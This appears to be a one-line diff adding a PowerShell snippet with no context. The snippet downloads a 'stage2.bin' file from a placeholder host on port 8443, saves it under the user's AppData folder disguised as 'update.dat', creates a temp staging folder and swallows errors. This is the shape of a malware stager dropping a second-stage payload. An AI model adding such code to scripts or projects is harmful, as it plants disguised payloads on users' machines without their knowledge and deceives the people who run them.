@@ -1,0 +1,1 @@
+try { $TargetUrl = "https://example.com:8443/stage2.bin"; $LocalPath = "$env:APPDATA\update.dat"; Invoke-WebRequest -Uri $TargetUrl -OutFile $LocalPath -UseBasicParsing; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Stage transfer failed" }
